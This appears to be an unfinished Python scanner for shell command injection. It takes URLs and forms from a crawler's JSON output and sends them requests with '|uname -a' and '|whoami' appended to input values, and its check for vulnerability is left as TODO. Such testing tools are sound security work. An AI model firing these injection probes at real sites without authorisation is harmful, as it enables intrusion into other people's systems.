import json
import requests

def read_json():
	obj_list = json.load(open('crawler_output.json'))
	#loop the json objects
	for obj in obj_list:
		#check the "form" elements in the json object
		if len(obj["form"]) > 0:
			has_form(obj["form"], obj["url"])

		if len(obj["parameter"]) > 0:
			has_param(obj["parameter"], obj["url"])

		#check the "parameter" elelments. TO DO
		#...

def has_form(form_list, url):
	for form in form_list:
		endpoint = url
		# TODO to verify if action will have full URL
		# check if "form" is submitted to a different endpoints
		if "action" in form:
			endpoint = url + form["action"]
		#print(endpoint)
		
		#get the "form" submit method: GET or POST
		isGetMethod = True
		if "method" in form:
			if form["method"].upper() == "POST":
				isGetMethod = False

		if isGetMethod:
			get_url = endpoint + get_input_string(form["input"])
			#print(get_url)
			r = requests.get(get_url)
			# TODO check if vulnerable
		else:
			if "input" in form:
				payload = get_post_payload(form["input"])
				r = requests.post(endpoint, payload)
				#print(r.text)
				# TODO check if vulnerable

def has_param(param_list, url):
	endpoint = url
	if "?" in url:
		#this is GET method
		endpoint = url #before ? part
		# get_param_string(param_list)
		get_url = endpoint + get_param_string(param_list)
		r = requests.get(get_url)
		# TODO check if vulnerable
		print(r.text)

####### Shell Command Injection #####
	
# Generate Form GET request payload 
def get_input_string(input_list):
	param_string = "?"
	for item in input_list:
		if "name" in item:
			value = "|uname -a"
			if "value" in item:
				value = item["value"] + "|whoami"

			param_string += item["name"] + "=" + value + "&"
	return param_string

# Generate normal GET request payload 
def get_param_string(param_list):
	param_string = "?"
	for key in param_list.keys():
		value = param_list[key][0]
		param_string += key + "=" + value + "|uname -a&"
	return param_string

def get_post_payload(input_list):
	payload = {}
	for item in input_list:
		if "name" in item:
			value = "|uname -a"
			if "value" in item:
				value = item["value"] + "|whoami"

			payload[item["name"]] = value
	return payload

read_json()